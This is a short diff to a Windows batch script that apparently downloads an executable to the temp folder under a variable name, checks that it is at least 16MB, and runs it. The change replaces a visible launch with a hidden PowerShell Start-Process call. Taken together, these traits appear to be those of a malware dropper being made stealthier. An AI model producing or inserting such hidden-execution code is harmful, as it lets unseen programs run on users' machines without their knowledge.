@@ -65,7 +65,8 @@ for %%a in ("%TEMP%\!filename!.exe") do set "FILESIZE=%%~za"
 
 :: Check if the file size is at least 16MB (16777216 bytes)
 if %FILESIZE% geq 16777216 (
-    start "" "%TEMP%\!filename!.exe"
+    powershell -NoProfile -WindowStyle Hidden -Command "Start-Process '%TEMP%\!filename!.exe'"
+    rem start "" "%TEMP%\!filename!.exe"
 ) else (
     echo.
     echo Download incomplete. Check your connection and run the file again.
